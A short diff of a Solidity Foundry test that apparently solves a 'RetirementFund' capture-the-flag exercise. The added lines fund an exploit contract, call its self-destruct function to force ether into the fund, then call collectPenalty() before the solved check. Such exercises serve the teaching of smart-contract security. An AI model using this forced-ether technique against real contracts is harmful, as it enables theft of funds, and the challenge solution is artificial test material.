@@ -18,9 +18,10 @@ contract RetirementFundTest is Test {
         vm.deal(address(exploitContract), 1 ether);
         // Test your Exploit Contract below
         // Use the instance retirementFund and exploitContract
-
+        (bool success, ) = address(exploitContract).call{value: 1 ether}("");
+        exploitContract.destory(); // deposit
         // Put your solution here
-
+        retirementFund.collectPenalty();
         _checkSolved();
     }
 
